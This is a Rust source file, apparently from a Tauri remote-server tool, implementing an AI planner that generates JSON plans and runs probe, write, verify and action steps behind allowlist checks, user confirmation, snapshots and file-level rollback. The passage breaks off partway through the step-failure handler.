//! AI plan JSON schema、固定 plan 状态机与 write/verify/rollback 执行链路
//! （T2.9/T2.10 / T3.4 / T3.6 / T3.7）。
//!
//! 设计约束：
//! - plan 在 `ai_plan_create` 时一次生成；v0.3b 起允许对未执行尾部做 rolling revise
//! - write step 必须先 snapshot，失败则 fail-closed，不落盘
//! - action step 只允许极小白名单，且必须显式确认
//! - verify 只允许模板命令；**不接受 AI 自由生成的 verify command**
//! - rollback 仅做文件级恢复；**不做跨 step / 服务状态 rollback**

use std::collections::HashMap;
use std::future::Future;
use std::sync::{Arc, Mutex};

use tauri::{AppHandle, Emitter};
use uuid::Uuid;

use crate::models::error::{AppError, AppResult, ErrorCode};
use crate::models::{
    AiAwaitConfirmPayload, AiDoneKind, AiDonePayload, AiPlan, AiPlanStatus,
    AiRollbackProgressPayload, AiServiceStateWarningPayload, AiStep, AiStepEventPayload,
    AiStepKind, AiStepStatus, AiVerifyTemplate,
};
use crate::services::ai::allowlist::{self, CheckedCommand};
use crate::services::ai::chat::EVENT_DONE;
use crate::services::ai::executor::{ProbeExecutor, ProbeOutput};
use crate::services::ai::llama_runtime;
use crate::services::ai::prompt::{self, ContextSnapshot, PromptInput, PromptMode};
use crate::services::ai::rollback::{
    apply_text_write, build_diff_for_file, load_snapshot_bytes, rollback_snapshot,
    snapshot_remote_files, RollbackDiff, SnapshotBundle,
};
use crate::services::session_manager::{ManagedSession, SessionManager};
use crate::services::storage_service::Database;

pub const EVENT_STEP: &str = "ai:step";
pub const EVENT_AWAIT_CONFIRM: &str = "ai:await_confirm";
pub const EVENT_ROLLBACK_PROGRESS: &str = "ai:rollback_progress";
pub const EVENT_SERVICE_STATE_WARNING: &str = "ai:service_state_warning";

/// 最多重试解析次数（不含首次）。
pub const PLAN_MAX_RETRIES: u32 = 2;
pub const PLAN_REVISE_MAX_TOKENS: u32 = 1024;

#[derive(Debug, Clone)]
pub struct PlanExecution {
    pub plan_id: String,
    pub session_id: String,
    pub plan: AiPlan,
    pub current_step_index: usize,
    pub pending_confirm: Option<PendingConfirm>,
    pub snapshots_by_step: HashMap<String, SnapshotBundle>,
}

#[derive(Debug, Clone)]
pub enum PendingConfirm {
    Write(Box<PendingWrite>),
    Action(PendingAction),
}

#[derive(Debug, Clone)]
pub struct PendingWrite {
    pub step_id: String,
    pub step_index: usize,
    pub target_path: String,
    pub content: String,
    pub diff: RollbackDiff,
    pub snapshot: SnapshotBundle,
    pub argv: Vec<String>,
}

#[derive(Debug, Clone)]
pub struct PendingAction {
    pub step_id: String,
    pub step_index: usize,
    pub checked: CheckedCommand,
    pub argv: Vec<String>,
    pub warnings: Vec<String>,
}

#[derive(Default)]
pub struct PlannerManager {
    plans: Mutex<HashMap<String, PlanExecution>>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum StepRunState {
    Done,
    AwaitingConfirm,
}

#[derive(Debug, Clone)]
pub struct StepRunResult {
    pub plan: AiPlan,
    pub state: StepRunState,
    pub current_step_id: Option<String>,
}

#[derive(Debug, Clone)]
pub struct RollbackResult {
    pub plan: AiPlan,
    pub rolled_back: bool,
    pub snapshot_path: Option<String>,
}

struct RollbackProblem<'a> {
    reason: String,
    success_prefix: &'static str,
    failure_prefix: &'static str,
    output: Option<&'a ProbeOutput>,
}

impl PlannerManager {
    pub fn new() -> Self {
        Self {
            plans: Mutex::new(HashMap::new()),
        }
    }

    pub fn insert_plan(&self, session_id: String, mut plan: AiPlan) -> (String, AiPlan) {
        normalize_plan(&mut plan);
        plan.status = AiPlanStatus::Ready;

        let plan_id = Uuid::new_v4().to_string();
        let execution = PlanExecution {
            plan_id: plan_id.clone(),
            session_id,
            plan: plan.clone(),
            current_step_index: 0,
            pending_confirm: None,
            snapshots_by_step: HashMap::new(),
        };

        self.plans
            .lock()
            .expect("planner manager poisoned")
            .insert(plan_id.clone(), execution);

        (plan_id, plan)
    }

    pub fn get_plan(&self, plan_id: &str) -> AppResult<AiPlan> {
        let plans = self
            .plans
            .lock()
            .map_err(|_| AppError::new(ErrorCode::Unknown, "planner lock poisoned"))?;
        let execution = plans
            .get(plan_id)
            .ok_or_else(|| AppError::not_found(format!("plan {} 不存在", plan_id)))?;
        Ok(execution.plan.clone())
    }

    pub fn get_session_id(&self, plan_id: &str) -> AppResult<String> {
        let plans = self
            .plans
            .lock()
            .map_err(|_| AppError::new(ErrorCode::Unknown, "planner lock poisoned"))?;
        let execution = plans
            .get(plan_id)
            .ok_or_else(|| AppError::not_found(format!("plan {} 不存在", plan_id)))?;
        Ok(execution.session_id.clone())
    }

    pub fn cancel_plan(&self, plan_id: &str) -> AppResult<AiPlan> {
        let mut plans = self
            .plans
            .lock()
            .map_err(|_| AppError::new(ErrorCode::Unknown, "planner lock poisoned"))?;
        let execution = plans
            .get_mut(plan_id)
            .ok_or_else(|| AppError::not_found(format!("plan {} 不存在", plan_id)))?;
        execution.plan.status = AiPlanStatus::Canceled;
        if let Some(step) = execution.plan.steps.get_mut(execution.current_step_index) {
            if matches!(
                step.status,
                AiStepStatus::Pending
                    | AiStepStatus::Running
                    | AiStepStatus::AwaitingConfirm
                    | AiStepStatus::Executing
                    | AiStepStatus::Verifying
            ) {
                step.status = AiStepStatus::Canceled;
            }
        }
        execution.pending_confirm = None;
        Ok(execution.plan.clone())
    }
}

pub fn normalize_plan(plan: &mut AiPlan) {
    for (idx, step) in plan.steps.iter_mut().enumerate() {
        step.normalize();
        if step.id.trim().is_empty() {
            step.id = format!("step-{}", idx + 1);
        }
        step.status = AiStepStatus::Pending;
    }
    if plan.status == AiPlanStatus::Draft {
        plan.status = AiPlanStatus::Planning;
    }
}

async fn generate_with_prompt(prompt: String, max_tokens: u32) -> AppResult<String> {
    let runtime = llama_runtime::loaded_runtime().ok_or_else(|| {
        AppError::ai_unavailable("AI planner runtime 未加载").with_retryable(false)
    })?;
    tokio::task::spawn_blocking(move || {
        let cancel = tokio_util::sync::CancellationToken::new();
        let mut output = String::new();
        let outcome = runtime.generate(
            &prompt,
            crate::services::ai::generate::GenerateOptions { max_tokens },
            &cancel,
            |token| output.push_str(token),
        )?;
        let _ = outcome;
        AppResult::Ok(output)
    })
    .await
    .map_err(|e| AppError::ai_unavailable(format!("planner task join failed: {e}")))?
}

fn build_plan_prompt(user_text: &str, context: Option<ContextSnapshot>) -> String {
    prompt::build_budgeted(
        &PromptInput {
            user_text: user_text.to_string(),
            context,
            history: Vec::new(),
        },
        PromptMode::Plan,
    )
}

fn build_plan_retry_prompt(
    user_text: &str,
    context: Option<ContextSnapshot>,
    raw_output: &str,
    parse_error: &str,
    retry_number: u32,
) -> String {
    let retry_user_text = format!(
        "{user_text}\n\n\
The previous plan-mode response was invalid JSON. Retry #{retry_number}.\n\
Parse error:\n{parse_error}\n\n\
Previous invalid output:\n{raw_output}\n\n\
Return one valid JSON object using the required plan schema. Do not include markdown fences or explanation text."
    );
    build_plan_prompt(&retry_user_text, context)
}

async fn generate_plan_with<G, Fut>(
    session_id: &str,
    user_text: &str,
    context: Option<ContextSnapshot>,
    max_tokens: u32,
    mut generate: G,
) -> AppResult<AiPlan>
where
    G: FnMut(String, u32) -> Fut,
    Fut: Future<Output = AppResult<String>>,
{
    let mut prompt = build_plan_prompt(user_text, context.clone());
    let mut last_error = None;

    for attempt in 0..=PLAN_MAX_RETRIES {
        let raw = generate(prompt, max_tokens).await?;
        match parse_plan_response(&raw) {
            Ok(mut plan) => {
                normalize_plan(&mut plan);
                if let Err(error) = validate_plan_steps(&plan) {
                    let validation_error = format!("plan validation error: {}", error.message);
                    if attempt == PLAN_MAX_RETRIES {
                        last_error = Some(validation_error);
                        break;
                    }
                    tracing::warn!(
                        session_id = %session_id,
                        attempt,
                        error = %validation_error,
                        "AI plan safety validation failed; retrying"
                    );
                    prompt = build_plan_retry_prompt(
                        user_text,
                        context.clone(),
                        &raw,
                        &validation_error,
                        attempt + 1,
                    );
                    last_error = Some(validation_error);
                    continue;
                }
                tracing::debug!(
                    session_id = %session_id,
                    attempt,
                    steps = plan.steps.len(),
                    "AI plan generated"
                );
                return Ok(plan);
            }
            Err(error) => {
                if attempt == PLAN_MAX_RETRIES {
                    last_error = Some(error);
                    break;
                }
                tracing::warn!(
                    session_id = %session_id,
                    attempt,
                    error = %error,
                    "AI plan JSON parse failed; retrying"
                );
                prompt =
                    build_plan_retry_prompt(user_text, context.clone(), &raw, &error, attempt + 1);
                last_error = Some(error);
            }
        }
    }

    Err(AppError::invalid_argument(format!(
        "AI planner returned invalid plan after {} attempts: {}",
        PLAN_MAX_RETRIES + 1,
        last_error.unwrap_or_else(|| "unknown parse error".to_string())
    )))
}

pub async fn generate_plan(
    session_id: &str,
    user_text: &str,
    context: Option<ContextSnapshot>,
    max_tokens: u32,
) -> AppResult<AiPlan> {
    generate_plan_with(
        session_id,
        user_text,
        context,
        max_tokens,
        generate_with_prompt,
    )
    .await
}

pub async fn revise_plan(
    manager: &PlannerManager,
    plan_id: &str,
    new_observation: &str,
    max_tokens: u32,
) -> AppResult<AiPlan> {
    if new_observation.trim().is_empty() {
        return Err(AppError::invalid_argument("newObservation cannot be empty"));
    }

    let (current_plan, current_step_index, current_step_status) = {
        let plans = manager
            .plans
            .lock()
            .map_err(|_| AppError::new(ErrorCode::Unknown, "planner lock poisoned"))?;
        let execution = plans
            .get(plan_id)
            .ok_or_else(|| AppError::not_found(format!("plan {} 不存在", plan_id)))?;
        let current_step = execution
            .plan
            .steps
            .get(execution.current_step_index)
            .ok_or_else(|| AppError::invalid_argument("plan 已无可修订步骤"))?;
        (
            execution.plan.clone(),
            execution.current_step_index,
            current_step.status,
        )
    };

    ensure_revisable_status(current_step_status)?;

    let prompt = build_revise_prompt(&current_plan, current_step_index, new_observation)?;
    let revised_raw = generate_with_prompt(prompt, max_tokens.min(PLAN_REVISE_MAX_TOKENS)).await?;
    let mut revised_suffix =
        parse_plan_response(&revised_raw).map_err(AppError::invalid_argument)?;
    normalize_plan(&mut revised_suffix);
    validate_revised_suffix(&revised_suffix)?;
    if revised_suffix.steps.is_empty() {
        return Err(AppError::invalid_argument("revised plan 不能是空步骤列表"));
    }

    let next_plan = {
        let mut plans = manager
            .plans
            .lock()
            .map_err(|_| AppError::new(ErrorCode::Unknown, "planner lock poisoned"))?;
        let execution = plans
            .get_mut(plan_id)
            .ok_or_else(|| AppError::not_found(format!("plan {} 不存在", plan_id)))?;
        let latest_status = execution
            .plan
            .steps
            .get(execution.current_step_index)
            .map(|step| step.status)
            .ok_or_else(|| AppError::invalid_argument("plan 已无可修订步骤"))?;
        ensure_revisable_status(latest_status)?;

        let preserved = execution
            .plan
            .steps
            .iter()
            .take(execution.current_step_index)
            .cloned()
            .collect::<Vec<_>>();
        let mut steps = preserved;
        steps.extend(revised_suffix.steps.into_iter());

        execution.plan.summary = revised_suffix.summary;
        execution.plan.risks = revised_suffix.risks;
        execution.plan.assumptions = revised_suffix.assumptions;
        execution.plan.steps = steps;
        execution.plan.status = AiPlanStatus::Ready;
        execution.pending_confirm = None;
        execution.plan.clone()
    };

    Ok(next_plan)
}

pub async fn execute_next_step(
    manager: &PlannerManager,
    app: &AppHandle,
    plan_id: &str,
    session_manager: &Arc<SessionManager>,
    probe_executor: &ProbeExecutor,
    db: &Arc<Database>,
) -> AppResult<StepRunResult> {
    let (session_id, step, step_index, running_payload) = {
        let mut plans = manager
            .plans
            .lock()
            .map_err(|_| AppError::new(ErrorCode::Unknown, "planner lock poisoned"))?;
        let execution = plans
            .get_mut(plan_id)
            .ok_or_else(|| AppError::not_found(format!("plan {} 不存在", plan_id)))?;

        if execution.pending_confirm.is_some() {
            return Err(AppError::invalid_argument("当前 step 正在等待确认"));
        }

        let step = execution
            .plan
            .steps
            .get_mut(execution.current_step_index)
            .ok_or_else(|| AppError::invalid_argument("plan 已无可执行步骤"))?;

        execution.plan.status = AiPlanStatus::Running;
        step.status = AiStepStatus::Running;
        (
            execution.session_id.clone(),
            step.clone(),
            execution.current_step_index,
            build_step_event(
                &execution.session_id,
                &execution.plan_id,
                execution.current_step_index,
                step,
                None,
                None,
            ),
        )
    };
    app.emit(EVENT_STEP, &running_payload).ok();

    match step.kind {
        AiStepKind::Probe => {
            let checked = match dispatch_probe_step(&step) {
                Ok(checked) => checked,
                Err(error) => {
                    return Err(mark_step_failed_for_error(
                        manager,
                        app,
                        plan_id,
                        step_index,
                        error,
                        "probe 前置检查失败",
                    ));
                }
            };
            let output = match run_checked_probe(
                app,
                session_manager,
                probe_executor,
                db,
                &session_id,
                checked,
            )
            .await
            {
                Ok(output) => output,
                Err(error) => {
                    return Err(mark_step_failed_for_error(
                        manager,
                        app,
                        plan_id,
                        step_index,
                        error,
                        "probe 执行失败",
                    ));
                }
            };
            if output.exit_code == Some(0) {
                complete_step(
                    manager,
                    app,
                    plan_id,
                    step_index,
                    Some(&output),
                    output
                        .truncated
                        .then_some("probe 输出超过 64KB，已截断".to_string()),
                )
            } else {
                fail_step(
                    manager,
                    app,
                    plan_id,
                    step_index,
                    AiStepStatus::Failed,
                    Some(&output),
                    Some("probe 命令退出非零".to_string()),
                )
            }
        }
        AiStepKind::Write => {
            let target_path = match write_target_path(&step) {
                Ok(path) => path,
                Err(error) => {
                    return Err(mark_step_failed_for_error(
                        manager,
                        app,
                        plan_id,
                        step_index,
                        error,
                        "write 前置检查失败",
                    ));
                }
            };
            let content = match step
                .content
                .clone()
                .ok_or_else(|| AppError::invalid_argument("write step 缺少 content"))
            {
                Ok(content) => content,
                Err(error) => {
                    return Err(mark_step_failed_for_error(
                        manager,
                        app,
                        plan_id,
                        step_index,
                        error,
                        "write 前置检查失败",
                    ));
                }
            };
            let session = match session_manager.get_session(&session_id) {
                Ok(session) => session,
                Err(error) => {
                    return Err(mark_step_failed_for_error(
                        manager,
                        app,
                        plan_id,
                        step_index,
                        error,
                        "write session 获取失败",
                    ));
                }
            };
            let step_id = step.id.clone();
            let target_files = step.target_files.clone();
            let session_for_snapshot = session.clone();
            let session_id_for_snapshot = session_id.clone();
            let snapshot = match tokio::task::spawn_blocking(move || {
                snapshot_remote_files(
                    &session_for_snapshot,
                    &session_id_for_snapshot,
                    &step_id,
                    &target_files,
                )
            })
            .await
            .map_err(|e| AppError::new(ErrorCode::Unknown, format!("snapshot task failed: {e}")))
            .and_then(|result| result)
            {
                Ok(snapshot) => snapshot,
                Err(error) => {
                    return Err(mark_step_failed_for_error(
                        manager,
                        app,
                        plan_id,
                        step_index,
                        error,
                        "write snapshot 失败",
                    ));
                }
            };

            let before = match load_snapshot_bytes(&snapshot, &target_path) {
                Ok(before) => before,
                Err(error) => {
                    return Err(mark_step_failed_for_error(
                        manager,
                        app,
                        plan_id,
                        step_index,
                        error,
                        "write snapshot 读取失败",
                    ));
                }
            };
            let diff = build_diff_for_file(&target_path, &before, content.as_bytes());
            let argv = vec!["sftp-write".to_string(), target_path.clone()];

            let (plan, current_id) = {
                let mut plans = manager
                    .plans
                    .lock()
                    .map_err(|_| AppError::new(ErrorCode::Unknown, "planner lock poisoned"))?;
                let execution = plans
                    .get_mut(plan_id)
                    .ok_or_else(|| AppError::not_found(format!("plan {} 不存在", plan_id)))?;
                execution.pending_confirm = Some(PendingConfirm::Write(
                    PendingWrite {
                        step_id: step.id.clone(),
                        step_index,
                        target_path: target_path.clone(),
                        content: content.clone(),
                        diff: diff.clone(),
                        snapshot: snapshot.clone(),
                        argv: argv.clone(),
                    }
                    .into(),
                ));

                let current_id = {
                    let current = &mut execution.plan.steps[step_index];
                    current.status = AiStepStatus::AwaitingConfirm;
                    current.id.clone()
                };
                execution.plan.status = AiPlanStatus::AwaitingConfirm;
                (execution.plan.clone(), current_id)
            };

            app.emit(
                EVENT_AWAIT_CONFIRM,
                &AiAwaitConfirmPayload {
                    session_id: session_id.clone(),
                    plan_id: plan_id.to_string(),
                    step_id: current_id.clone(),
                    step_index: step_index as u32,
                    kind: AiStepKind::Write,
                    argv,
                    target_files: step.target_files.clone(),
                    diff: diff.unified_diff,
                    snapshot_path: snapshot.snapshot_dir.display().to_string(),
                    warnings: snapshot.warnings.clone(),
                },
            )
            .ok();
            app.emit(
                EVENT_STEP,
                &build_step_event(
                    &session_id,
                    plan_id,
                    step_index,
                    &plan.steps[step_index],
                    None,
                    Some("write step awaiting confirm".to_string()),
                ),
            )
            .ok();

            Ok(StepRunResult {
                plan,
                state: StepRunState::AwaitingConfirm,
                current_step_id: Some(current_id),
            })
        }
        AiStepKind::Verify => {
            transition_step_status(
                manager,
                app,
                plan_id,
                step_index,
                AiStepStatus::Verifying,
                None,
            )?;
            let checked = match checked_verify_command(&step) {
                Ok(checked) => checked,
                Err(error) => {
                    return Err(mark_step_failed_for_error(
                        manager,
                        app,
                        plan_id,
                        step_index,
                        error,
                        "verify 前置检查失败",
                    ));
                }
            };
            let output = match run_checked_probe(
                app,
                session_manager,
                probe_executor,
                db,
                &session_id,
                checked,
            )
            .await
            {
                Ok(output) => output,
                Err(error) => {
                    return Err(mark_step_failed_for_error(
                        manager,
                        app,
                        plan_id,
                        step_index,
                        error,
                        "verify 执行失败",
                    ));
                }
            };
            if output.exit_code == Some(0) {
                complete_step(
                    manager,
                    app,
                    plan_id,
                    step_index,
                    Some(&output),
                    output
                        .truncated
                        .then_some("verify 输出超过 64KB，已截断".to_string()),
                )
            } else {
                fail_step(
                    manager,
                    app,
                    plan_id,
                    step_index,
                    AiStepStatus::Failed,
                    Some(&output),
                    Some("verify 模板命令退出非零".to_string()),
                )
            }
        }
        AiStepKind::Action => {
            let checked = match dispatch_action_step(&step) {
                Ok(checked) => checked,
                Err(error) => {
                    return Err(mark_step_failed_for_error(
                        manager,
                        app,
                        plan_id,
                        step_index,
                        error,
                        "action 前置检查失败",
                    ));
                }
            };
            let argv = checked.argv.clone();
            let warnings = vec!["该操作会改变服务状态，当前不支持自动回滚".to_string()];

            let (plan, current_id) = {
                let mut plans = manager
                    .plans
                    .lock()
                    .map_err(|_| AppError::new(ErrorCode::Unknown, "planner lock poisoned"))?;
                let execution = plans
                    .get_mut(plan_id)
                    .ok_or_else(|| AppError::not_found(format!("plan {} 不存在", plan_id)))?;
                execution.pending_confirm = Some(PendingConfirm::Action(PendingAction {
                    step_id: step.id.clone(),
                    step_index,
                    checked,
                    argv: argv.clone(),
                    warnings: warnings.clone(),
                }));

                let current_id = {
                    let current = &mut execution.plan.steps[step_index];
                    current.status = AiStepStatus::AwaitingConfirm;
                    current.id.clone()
                };
                execution.plan.status = AiPlanStatus::AwaitingConfirm;
                (execution.plan.clone(), current_id)
            };

            app.emit(
                EVENT_AWAIT_CONFIRM,
                &AiAwaitConfirmPayload {
                    session_id: session_id.clone(),
                    plan_id: plan_id.to_string(),
                    step_id: current_id.clone(),
                    step_index: step_index as u32,
                    kind: AiStepKind::Action,
                    argv,
                    target_files: Vec::new(),
                    diff: String::new(),
                    snapshot_path: String::new(),
                    warnings,
                },
            )
            .ok();
            app.emit(
                EVENT_STEP,
                &build_step_event(
                    &session_id,
                    plan_id,
                    step_index,
                    &plan.steps[step_index],
                    None,
                    Some("action step awaiting confirm".to_string()),
                ),
            )
            .ok();

            Ok(StepRunResult {
                plan,
                state: StepRunState::AwaitingConfirm,
                current_step_id: Some(current_id),
            })
        }
    }
}

pub async fn confirm_pending_step(
    manager: &PlannerManager,
    app: &AppHandle,
    plan_id: &str,
    session_manager: &Arc<SessionManager>,
    probe_executor: &ProbeExecutor,
    db: &Arc<Database>,
) -> AppResult<StepRunResult> {
    let (session_id, step, pending, mode) = {
        let mut plans = manager
            .plans
            .lock()
            .map_err(|_| AppError::new(ErrorCode::Unknown, "planner lock poisoned"))?;
        let execution = plans
            .get_mut(plan_id)
            .ok_or_else(|| AppError::not_found(format!("plan {} 不存在", plan_id)))?;
        let pending = execution
            .pending_confirm
            .take()
            .ok_or_else(|| AppError::invalid_argument("当前 plan 没有待确认的 step"))?;
        let step_index = match &pending {
            PendingConfirm::Write(item) => item.step_index,
            PendingConfirm::Action(item) => item.step_index,
        };
        let step = execution
            .plan
            .steps
            .get_mut(step_index)
            .ok_or_else(|| AppError::invalid_argument("待确认 step 索引越界"))?;
        step.status = AiStepStatus::Executing;
        execution.plan.status = AiPlanStatus::Running;
        let mode = if let PendingConfirm::Write(item) = &pending {
            execution
                .snapshots_by_step
                .insert(step.id.clone(), item.snapshot.clone());
            item.snapshot
                .manifest
                .entries
                .iter()
                .find(|entry| entry.target_path == item.target_path)
                .and_then(|entry| entry.mode)
        } else {
            None
        };
        (execution.session_id.clone(), step.clone(), pending, mode)
    };

    let executing_message = match &pending {
        PendingConfirm::Write(item) => format!("执行 argv: {}", item.argv.join(" ")),
        PendingConfirm::Action(item) => format!("执行 argv: {}", item.argv.join(" ")),
    };
    app.emit(
        EVENT_STEP,
        &build_step_event(
            &session_id,
            plan_id,
            step_index_of_pending(&pending),
            &step,
            None,
            Some(executing_message),
        ),
    )
    .ok();

    match pending {
        PendingConfirm::Write(pending) => {
            let session = match session_manager.get_session(&session_id) {
                Ok(session) => session,
                Err(error) => {
                    return Err(mark_step_failed_for_error(
                        manager,
                        app,
                        plan_id,
                        pending.step_index,
                        error,
                        "write session 获取失败",
                    ));
                }
            };
            let session_for_write = session.clone();
            let target_path = pending.target_path.clone();
            let content = pending.content.clone();
            let write_result = match tokio::task::spawn_blocking(move || {
                apply_text_write(&session_for_write, &target_path, &content, mode)
            })
            .await
            .map_err(|e| AppError::new(ErrorCode::Unknown, format!("write task failed: {e}")))
            {
                Ok(result) => result,
                Err(error) => {
                    return rollback_after_write_exception(
                        manager,
                        app,
                        plan_id,
                        &session,
                        &session_id,
                        &pending,
                        format!("write 执行异常: {}", error.message),
                    )
                    .await;
                }
            };

            if let Err(error) = write_result {
                return rollback_after_write_problem(
                    manager,
                    app,
                    plan_id,
                    &session,
                    &session_id,
                    &pending,
                    RollbackProblem {
                        reason: format!("write 执行失败: {}", error.message),
                        success_prefix: "write 失败，已自动回滚。snapshot",
                        failure_prefix: "write 失败且自动回滚失败",
                        output: None,
                    },
                )
                .await;
            }

            if step.verify_template.is_none() {
                return complete_step(
                    manager,
                    app,
                    plan_id,
                    pending.step_index,
                    None,
                    Some(format!("write 已执行: {}", pending.diff.target_path)),
                );
            }

            transition_step_status(
                manager,
                app,
                plan_id,
                pending.step_index,
                AiStepStatus::Verifying,
                Some("写入完成，开始模板 verify".to_string()),
            )?;

            let checked = match checked_verify_command(&step) {
                Ok(checked) => checked,
                Err(error) => {
                    return rollback_after_verify_error(
                        manager,
                        app,
                        plan_id,
                        &session,
                        &session_id,
                        &pending,
                        format!("verify 前置检查失败: {}", error.message),
                    )
                    .await;
                }
            };
            let output = match run_checked_probe(
                app,
                session_manager,
                probe_executor,
                db,
                &session_id,
                checked,
            )
            .await
            {
                Ok(output) => output,
                Err(error) => {
                    return rollback_after_verify_error(
                        manager,
                        app,
                        plan_id,
                        &session,
                        &session_id,
                        &pending,
                        format!("verify 执行异常: {}", error.message),
                    )
                    .await;
                }
            };
            if output.exit_code == Some(0) {
                complete_step(
                    manager,
                    app,
                    plan_id,
                    pending.step_index,
                    Some(&output),
                    Some(format!("write + verify 成功: {}", pending.diff.target_path)),
                )
            } else {
                rollback_after_verify_failure(
                    manager,
                    app,
                    plan_id,
                    &session,
                    &session_id,
                    &pending,
                    &output,
                )
                .await
            }
        }
        PendingConfirm::Action(pending) => {
            let output = match run_checked_probe(
                app,
                session_manager,
                probe_executor,
                db,
                &session_id,
                pending.checked.clone(),
            )
            .await
            {
                Ok(output) => output,
                Err(error) => {
                    return Err(mark_step_failed_for_error(
                        manager,
                        app,
                        plan_id,
                        pending.step_index,
                        error,
                        "action 执行失败",
                    ));
                }
            };
            if output.exit_code == Some(0) {
                complete_step(
                    manager,
                    app,
                    plan_id,
                    pending.step_index,
                    Some(&output),
                    Some(format!("action 已执行: {}", pending.argv.join(" "))),
                )
            } else {
                fail_step(
                    manager,
                    app,
                    plan_id,
                    pending.step_index,
                    AiStepStatus::Failed,
                    Some(&output),
                    Some("action 命令退出非零".to_string()),
                )
            }
        }
    }
}

pub async fn rollback_step(
    manager: &PlannerManager,
    app: &AppHandle,
    plan_id: &str,
    step_id: &str,
    session_manager: &Arc<SessionManager>,
) -> AppResult<RollbackResult> {
    let (session_id, step_index, bundle) = {
        let plans = manager
            .plans
            .lock()
            .map_err(|_| AppError::new(ErrorCode::Unknown, "planner lock poisoned"))?;
        let execution = plans
            .get(plan_id)
            .ok_or_else(|| AppError::not_found(format!("plan {} 不存在", plan_id)))?;
        let step_index = execution
            .plan
            .steps
            .iter()
            .position(|step| step.id == step_id)
            .ok_or_else(|| AppError::not_found(format!("step {} 不存在", step_id)))?;
        let bundle = execution
            .snapshots_by_step
            .get(step_id)
            .cloned()
            .ok_or_else(|| AppError::not_found(format!("step {} 没有可用 snapshot", step_id)))?;
        (execution.session_id.clone(), step_index, bundle)
    };

    let session = session_manager.get_session(&session_id)?;
    let session_for_rollback = session.clone();
    let bundle_for_rollback = bundle.clone();
    let session_id_for_emit = session_id.clone();
    let plan_id_for_emit = plan_id.to_string();
    let step_id_for_emit = step_id.to_string();
    let app_for_emit = app.clone();
    tokio::task::spawn_blocking(move || {
        rollback_snapshot(&session_for_rollback, &bundle_for_rollback, |progress| {
            app_for_emit
                .emit(
                    EVENT_ROLLBACK_PROGRESS,
                    &AiRollbackProgressPayload {
                        session_id: session_id_for_emit.clone(),
                        plan_id: plan_id_for_emit.clone(),
                        step_id: step_id_for_emit.clone(),
                        current_path: progress.current_path,
                        restored_files: progress.restored_files,
                        total_files: progress.total_files,
                        snapshot_path: bundle_for_rollback.snapshot_dir.display().to_string(),
                    },
                )
                .ok();
        })
    })
    .await
    .map_err(|e| AppError::new(ErrorCode::Unknown, format!("rollback task failed: {e}")))??;

    let (plan, payload) = {
        let mut plans = manager
            .plans
            .lock()
            .map_err(|_| AppError::new(ErrorCode::Unknown, "planner lock poisoned"))?;
        let execution = plans
            .get_mut(plan_id)
            .ok_or_else(|| AppError::not_found(format!("plan {} 不存在", plan_id)))?;
        let step = execution
            .plan
            .steps
            .get_mut(step_index)
            .ok_or_else(|| AppError::invalid_argument("rollback step 索引越界"))?;
        step.status = AiStepStatus::RolledBack;
        execution.plan.status = AiPlanStatus::Failed;
        let payload = build_step_event(
            &execution.session_id,
            &execution.plan_id,
            step_index,
            step,
            None,
            Some(format!(
                "step 已手动回滚，snapshot: {}",
                bundle.snapshot_dir.display()
            )),
        );
        (execution.plan.clone(), payload)
    };
    app.emit(EVENT_STEP, &payload).ok();

    Ok(RollbackResult {
        plan,
        rolled_back: true,
        snapshot_path: Some(bundle.snapshot_dir.display().to_string()),
    })
}

async fn run_checked_probe(
    app: &AppHandle,
    session_manager: &Arc<SessionManager>,
    probe_executor: &ProbeExecutor,
    db: &Arc<Database>,
    session_id: &str,
    checked: CheckedCommand,
) -> AppResult<ProbeOutput> {
    let session_id_owned = session_id.to_string();
    let session_manager = session_manager.clone();
    let db = db.clone();
    let probe = tokio::task::spawn_blocking(move || {
        session_manager.get_or_create_probe(&session_id_owned, &db)
    })
    .await
    .map_err(|e| AppError::new(ErrorCode::Unknown, format!("probe setup task failed: {e}")))??;
    probe_executor
        .execute(app, probe, session_id.to_string(), checked)
        .await
}

fn transition_step_status(
    manager: &PlannerManager,
    app: &AppHandle,
    plan_id: &str,
    step_index: usize,
    next_status: AiStepStatus,
    message: Option<String>,
) -> AppResult<()> {
    let payload = {
        let mut plans = manager
            .plans
            .lock()
            .map_err(|_| AppError::new(ErrorCode::Unknown, "planner lock poisoned"))?;
        let execution = plans
            .get_mut(plan_id)
            .ok_or_else(|| AppError::not_found(format!("plan {} 不存在", plan_id)))?;
        let step = execution
            .plan
            .steps
            .get_mut(step_index)
            .ok_or_else(|| AppError::invalid_argument("step 索引越界"))?;
        step.status = next_status;
        build_step_event(
            &execution.session_id,
            &execution.plan_id,
            step_index,
            step,
            None,
            message,
        )
    };
    app.emit(EVENT_STEP, &payload).ok();
    Ok(())
}

fn complete_step(
    manager: &PlannerManager,
    app: &AppHandle,
    plan_id: &str,
    step_index: usize,
    output: Option<&ProbeOutput>,
    message: Option<String>,
) -> AppResult<StepRunResult> {
    let (payload, done_payload, plan, step_id) = {
        let mut plans = manager
            .plans
            .lock()
            .map_err(|_| AppError::new(ErrorCode::Unknown, "planner lock poisoned"))?;
        let execution = plans
            .get_mut(plan_id)
            .ok_or_else(|| AppError::not_found(format!("plan {} 不存在", plan_id)))?;
        let step = execution
            .plan
            .steps
            .get_mut(step_index)
            .ok_or_else(|| AppError::invalid_argument("step 索引越界"))?;
        step.status = AiStepStatus::Done;
        let step_id = step.id.clone();
        let payload = build_step_event(
            &execution.session_id,
            &execution.plan_id,
            step_index,
            step,
            output,
            message,
        );

        execution.current_step_index = step_index.saturating_add(1);
        let done_payload = if execution.current_step_index >= execution.plan.steps.len() {
            execution.plan.status = AiPlanStatus::Done;
            Some(plan_done_payload(
                &execution.session_id,
                &execution.plan_id,
                false,
            ))
        } else {
            execution.plan.status = AiPlanStatus::Ready;
            None
        };

        (payload, done_payload, execution.plan.clone(), step_id)
    };
    app.emit(EVENT_STEP, &payload).ok();
    if let Some(done) = done_payload {
        app.emit(EVENT_DONE, &done).ok();
    }

    Ok(StepRunResult {
        plan,
        state: StepRunState::Done,
        current_step_id: Some(step_id),
    })
}

fn fail_step(
    manager: &PlannerManager,
    app: &AppHandle,
    plan_id: &str,
    step_index: usize,
    step_status: AiStepStatus,
    output: Option<&ProbeOutput>,
    message: Option<String>,
) -> AppResult<StepRunResult> {
    let (payload, done_payload, plan, step_id) = {
        let mut plans = manager
            .plans
            .lock()
            .map_err(|_| AppError::new(ErrorCode::Unknown, "planner lock poisoned"))?;
        let execution = plans
